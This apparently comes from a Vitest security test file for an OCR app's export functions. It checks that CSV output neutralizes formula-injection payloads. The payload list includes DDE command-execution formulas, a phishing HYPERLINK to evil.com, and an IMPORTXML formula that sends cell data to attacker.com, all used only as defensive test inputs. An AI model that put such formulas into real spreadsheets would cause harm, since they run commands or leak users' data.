/**
 * frontend/src/__tests__/adversarial_export_security.test.ts
 * Comprehensive Empirical Adversarial Stress Test for Export Security & Formats (CWE-1236)
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  exportDocumentAsJson,
  exportDocumentAsTxt,
  exportDocumentAsCsv,
  copyTextToClipboard,
  downloadFile,
} from '@/lib/exportUtils';
import { DocumentOCRResult } from '@/types/ocr';
import { SAMPLE_MULTIPAGE } from '@/lib/sampleDocuments';

describe('Adversarial Export Security & Format Stress Tests (CWE-1236)', () => {
  // =========================================================================
  // 1. COMPREHENSIVE CWE-1236 FORMULA INJECTION EXPLOIT PAYLOADS
  // =========================================================================
  describe('1. CWE-1236 CSV Formula Injection Sanitization', () => {
    const cwe1236Payloads = [
      { name: 'DDE Command Execution', payload: `=cmd|' /C calc'!A0` },
      { name: 'Formula Function @SUM', payload: `@SUM(1,1)` },
      { name: 'Formula Function =SUM', payload: `=SUM(1+1)` },
      { name: 'Formula Negative Expression', payload: `-1+1` },
      { name: 'Formula Positive Expression', payload: `+1+1` },
      { name: 'Leading Tab Injection', payload: `\tmalicious_payload` },
      { name: 'Leading Carriage Return Injection', payload: `\rattack_command` },
      { name: 'DDE Server Lookup', payload: `=DDE("cmd";"/C notepad.exe";"__DDE__")` },
      { name: 'Hyperlink Phishing Injection', payload: `=HYPERLINK("http://evil.com/phish","Click Here")` },
      { name: 'Spreadsheet Macro Injection', payload: `+HYPERLINK("javascript:alert(1)","Link")` },
      { name: 'ImportXML Data Exfiltration', payload: `@IMPORTXML("http://attacker.com/leak?data="&A1,"//a")` },
      { name: 'Minus Sign Subtraction Formula', payload: `-2+3*4` },
      { name: 'Plus Sign Addition Formula', payload: `+2+3*4` },
      { name: 'Leading Tab with Equal Sign', payload: `\t=cmd|' /C calc'!A0` },
      { name: 'Leading CR with Equal Sign', payload: `\r=1+1` },
    ];

    cwe1236Payloads.forEach(({ name, payload }) => {
      it(`neutralizes ${name} in word-level tokens: ${JSON.stringify(payload)}`, () => {
        const maliciousDoc: DocumentOCRResult = {
          document_id: 'doc_cwe_test',
          filename: 'cwe1236_attack.png',
          total_pages: 1,
          mean_confidence: 0.95,
          processing_time_ms: 50,
          full_text: payload,
          pages: [
            {
              page_number: 1,
              width: 1000,
              height: 1000,
              mean_confidence: 0.95,
              full_text: payload,
              lines: [
                {
                  line_id: payload,
                  line_number: 1,
                  text: payload,
                  original_text: payload,
                  confidence: 0.95,
                  bbox: [0.1, 0.1, 0.2, 0.9],
                  words: [
                    {
                      word_id: payload,
                      text: payload,
                      original_text: payload,
                      confidence: 0.95,
                      bbox: [0.1, 0.1, 0.2, 0.5],
                    },
                  ],
                },
              ],
            },
          ],
        };

        const csv = exportDocumentAsCsv(maliciousDoc);
        const rows = csv.split('\n');
        expect(rows.length).toBe(2); // Header + 1 row
        const row = rows[1];

        // Parse CSV fields handling quoted strings
        const fields = row.match(/(".*?"|[^",\s]+)(?=\s*,|\s*$)/g) || [];

        // All fields that contain formula prefixes must have leading single quote inside quotes
        expect(row).toContain(`"\'${payload.replace(/"/g, '""')}"`);
      });

      it(`neutralizes ${name} in line-level only documents: ${JSON.stringify(payload)}`, () => {
        const lineOnlyDoc: DocumentOCRResult = {
          document_id: 'doc_cwe_line',
          filename: 'cwe1236_line.png',
          total_pages: 1,
          mean_confidence: 0.92,
          processing_time_ms: 30,
          full_text: payload,
          pages: [
            {
              page_number: 1,
              width: 1000,
              height: 1000,
              mean_confidence: 0.92,
              full_text: payload,
              lines: [
                {
                  line_id: payload,
                  line_number: 1,
                  text: payload,
                  original_text: payload,
                  confidence: 0.92,
                  bbox: [0.1, 0.1, 0.2, 0.9],
                  words: [], // line-level only
                },
              ],
            },
          ],
        };

        const csv = exportDocumentAsCsv(lineOnlyDoc);
        expect(csv).toContain(`"\'${payload.replace(/"/g, '""')}"`);
      });
    });

    it('neutralizes all injection prefixes simultaneously across lines and words', () => {
      const multiAttackDoc: DocumentOCRResult = {
        document_id: 'doc_multi_attack',
        filename: 'multi_attack.png',
        total_pages: 1,
        mean_confidence: 0.88,
        processing_time_ms: 120,
        full_text: 'Attack Lines',
        pages: [
          {
            page_number: 1,
            width: 1200,
            height: 1600,
            mean_confidence: 0.88,
            full_text: 'Attack Lines',
            lines: [
              {
                line_id: '=line_cmd',
                line_number: 1,
                text: '+line_plus',
                original_text: '-line_minus',
                confidence: 0.85,
                bbox: [0.1, 0.1, 0.2, 0.8],
                words: [
                  {
                    word_id: '@word_at',
                    text: '+word_plus',
                    original_text: '-word_minus',
                    confidence: 0.85,
                    bbox: [0.1, 0.1, 0.2, 0.4],
                  },
                ],
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(multiAttackDoc);
      expect(csv).toContain('"\'=line_cmd"');
      expect(csv).toContain('"\'@word_at"');
      expect(csv).toContain('"\'+word_plus"');
      expect(csv).toContain('"\'-word_minus"');
    });
  });

  // =========================================================================
  // 2. RFC 4180 COMPLIANCE: NESTED QUOTES, MULTILINE, COMMAS & SPECIAL CHARS
  // =========================================================================
  describe('2. RFC 4180 Compliance (Quotes, Multiline, Commas)', () => {
    it('properly doubles internal quotes per RFC 4180', () => {
      const doc: DocumentOCRResult = {
        document_id: 'doc_quotes',
        filename: 'quotes.png',
        total_pages: 1,
        mean_confidence: 0.9,
        processing_time_ms: 40,
        full_text: 'Text with "double quotes" and """nested""" quotes',
        pages: [
          {
            page_number: 1,
            width: 1000,
            height: 1000,
            mean_confidence: 0.9,
            full_text: 'Text with "double quotes"',
            lines: [
              {
                line_id: 'l1',
                line_number: 1,
                text: 'Prescription: "Amoxicillin" 500mg ("TID")',
                original_text: 'Prescription: "Amoxicillin" 500mg ("TID")',
                confidence: 0.9,
                bbox: [0.1, 0.1, 0.2, 0.9],
                words: [
                  {
                    word_id: 'w1',
                    text: '"Amoxicillin"',
                    original_text: '"""triple quoted"""',
                    confidence: 0.9,
                    bbox: [0.1, 0.1, 0.2, 0.5],
                  },
                ],
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(doc);
      expect(csv).toContain('"""Amoxicillin"""');
      expect(csv).toContain('"""""""triple quoted"""""""');
    });

    it('safely handles embedded newlines inside CSV cell values', () => {
      const doc: DocumentOCRResult = {
        document_id: 'doc_multiline',
        filename: 'multiline.png',
        total_pages: 1,
        mean_confidence: 0.9,
        processing_time_ms: 40,
        full_text: 'Line 1\nLine 2\r\nLine 3',
        pages: [
          {
            page_number: 1,
            width: 1000,
            height: 1000,
            mean_confidence: 0.9,
            full_text: 'Line 1\nLine 2\r\nLine 3',
            lines: [
              {
                line_id: 'l1',
                line_number: 1,
                text: 'Multi\nLine\r\nValue',
                original_text: 'Multi\nLine\r\nValue',
                confidence: 0.9,
                bbox: [0.1, 0.1, 0.2, 0.9],
                words: [
                  {
                    word_id: 'w1',
                    text: 'Multi\nLine',
                    original_text: 'Multi\nLine',
                    confidence: 0.9,
                    bbox: [0.1, 0.1, 0.2, 0.5],
                  },
                ],
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(doc);
      expect(csv).toContain('"Multi\nLine"');
    });

    it('safely handles commas inside cells without disrupting column alignment', () => {
      const doc: DocumentOCRResult = {
        document_id: 'doc_commas',
        filename: 'commas.png',
        total_pages: 1,
        mean_confidence: 0.9,
        processing_time_ms: 40,
        full_text: 'Dr. Smith, MD, FACP, Clinic',
        pages: [
          {
            page_number: 1,
            width: 1000,
            height: 1000,
            mean_confidence: 0.9,
            full_text: 'Dr. Smith, MD, FACP, Clinic',
            lines: [
              {
                line_id: 'l1',
                line_number: 1,
                text: 'Dr. Smith, MD, FACP, Clinic',
                original_text: 'Dr. Smith, MD, FACP, Clinic',
                confidence: 0.9,
                bbox: [0.1, 0.1, 0.2, 0.9],
                words: [
                  {
                    word_id: 'w1',
                    text: 'Smith, MD',
                    original_text: 'Smith, MD',
                    confidence: 0.9,
                    bbox: [0.1, 0.1, 0.2, 0.5],
                  },
                ],
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(doc);
      expect(csv).toContain('"Smith, MD"');
    });
  });

  // =========================================================================
  // 3. NULL, UNDEFINED, EMPTY AND DEGENERATE DATA STRUCTURES
  // =========================================================================
  describe('3. Null, Undefined, Degenerate and Boundary Inputs', () => {
    it('handles document with empty pages array', () => {
      const emptyDoc: DocumentOCRResult = {
        document_id: 'doc_empty',
        filename: 'empty.png',
        total_pages: 0,
        mean_confidence: 0,
        processing_time_ms: 0,
        full_text: '',
        pages: [],
      };

      const jsonStr = exportDocumentAsJson(emptyDoc);
      const parsed = JSON.parse(jsonStr);
      expect(parsed.pages).toEqual([]);

      const txt = exportDocumentAsTxt(emptyDoc);
      expect(txt).toBe('');

      const csv = exportDocumentAsCsv(emptyDoc);
      const rows = csv.trim().split('\n');
      expect(rows.length).toBe(1); // Header only
      expect(rows[0]).toContain('page,line_number,line_id,word_id');
    });

    it('handles line without words array in CSV, JSON and TXT', () => {
      const docNoWords: DocumentOCRResult = {
        document_id: 'doc_no_words',
        filename: 'no_words.png',
        total_pages: 1,
        mean_confidence: 0.85,
        processing_time_ms: 50,
        full_text: 'Unsegmented line text',
        pages: [
          {
            page_number: 1,
            width: 1000,
            height: 1000,
            mean_confidence: 0.85,
            full_text: 'Unsegmented line text',
            lines: [
              {
                line_id: 'l_solo',
                line_number: 1,
                text: 'Unsegmented line text',
                original_text: 'Unsegmented line text',
                confidence: 0.85,
                bbox: [0.1, 0.1, 0.2, 0.8],
                words: [], // No word segmentation
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(docNoWords);
      const rows = csv.split('\n');
      expect(rows.length).toBe(2);
      expect(rows[1]).toContain('"l_solo"');
      expect(rows[1]).toContain('"Unsegmented line text"');

      const jsonStr = exportDocumentAsJson(docNoWords);
      const parsed = JSON.parse(jsonStr);
      expect(parsed.pages[0].lines[0].words).toEqual([]);

      const txt = exportDocumentAsTxt(docNoWords);
      expect(txt).toBe('Unsegmented line text');
    });

    it('handles null/undefined optional fields in JSON serialization', () => {
      const partialDoc: DocumentOCRResult = {
        document_id: 'doc_partial',
        filename: 'partial.png',
        total_pages: 1,
        mean_confidence: 0.91,
        processing_time_ms: 30,
        full_text: 'Partial text',
        pages: [
          {
            page_number: 1,
            width: 800,
            height: 1000,
            mean_confidence: 0.91,
            full_text: 'Partial line',
            lines: [
              {
                line_id: 'l_partial',
                text: 'Partial line',
                confidence: 0.91,
                bbox: [0.1, 0.1, 0.2, 0.8],
                words: [
                  {
                    word_id: 'w_partial',
                    text: 'Partial',
                    confidence: 0.91,
                    bbox: [0.1, 0.1, 0.2, 0.4],
                  },
                ],
              },
            ],
          },
        ],
      };

      const jsonStr = exportDocumentAsJson(partialDoc);
      const parsed = JSON.parse(jsonStr);
      expect(parsed.document_id).toBe('doc_partial');
      expect(parsed.pages[0].lines[0].original_text).toBe('Partial line');
      expect(parsed.pages[0].lines[0].words[0].original_text).toBe('Partial');
      expect(parsed.pages[0].lines[0].is_edited).toBe(false);
      expect(parsed.pages[0].lines[0].words[0].is_edited).toBe(false);
    });
  });

  // =========================================================================
  // 4. CLIPBOARD COPY & DOWNLOAD ADVERSARIAL STRESS
  // =========================================================================
  describe('4. Clipboard & File Download Harness', () => {
    beforeEach(() => {
      vi.restoreAllMocks();
    });

    it('copies text via modern navigator.clipboard.writeText', async () => {
      const writeTextMock = vi.fn().mockResolvedValue(undefined);
      Object.defineProperty(navigator, 'clipboard', {
        value: { writeText: writeTextMock },
        configurable: true,
      });

      const success = await copyTextToClipboard('Adversarial clipboard string');
      expect(success).toBe(true);
      expect(writeTextMock).toHaveBeenCalledWith('Adversarial clipboard string');
    });

    it('seamlessly falls back to textarea execCommand when navigator.clipboard throws', async () => {
      Object.defineProperty(navigator, 'clipboard', {
        value: {
          writeText: vi.fn().mockRejectedValue(new DOMException('Permission Denied', 'NotAllowedError')),
        },
        configurable: true,
      });

      document.execCommand = vi.fn().mockReturnValue(true);

      const success = await copyTextToClipboard('Fallback clipboard string');
      expect(success).toBe(true);
      expect(document.execCommand).toHaveBeenCalledWith('copy');
    });

    it('returns false when both navigator.clipboard and execCommand fail', async () => {
      Object.defineProperty(navigator, 'clipboard', {
        value: {
          writeText: vi.fn().mockRejectedValue(new Error('Fatal clipboard error')),
        },
        configurable: true,
      });

      document.execCommand = vi.fn().mockImplementation(() => {
        throw new Error('execCommand disabled in sandbox');
      });

      const success = await copyTextToClipboard('Failed string');
      expect(success).toBe(false);
    });

    it('creates Blob and triggers anchor download with revokeObjectURL cleanup', () => {
      const clickSpy = vi.fn();
      const removeSpy = vi.fn();
      const originalCreateElement = document.createElement.bind(document);

      vi.spyOn(document, 'createElement').mockImplementation((tagName: string) => {
        const el = originalCreateElement(tagName);
        if (tagName === 'a') {
          el.click = clickSpy;
          el.remove = removeSpy;
        }
        return el;
      });

      const revokeSpy = vi.spyOn(URL, 'revokeObjectURL');

      downloadFile('page,text\n1,hello', 'export.csv', 'text/csv;charset=utf-8;');

      expect(clickSpy).toHaveBeenCalledTimes(1);
      expect(removeSpy).toHaveBeenCalledTimes(1);
      expect(revokeSpy).toHaveBeenCalledTimes(1);
    });
  });
});
